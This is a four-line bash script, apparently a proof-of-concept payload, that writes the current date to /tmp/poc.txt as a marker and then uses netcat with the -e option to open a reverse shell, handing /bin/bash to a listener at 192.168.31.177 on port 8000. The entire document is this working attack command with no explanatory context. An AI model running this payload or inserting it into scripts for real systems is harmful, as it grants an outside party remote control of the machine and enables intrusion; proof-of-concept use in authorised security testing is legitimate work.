#!/bin/bash

date >> /tmp/poc.txt
nc 192.168.31.177 8000 -e /bin/bash
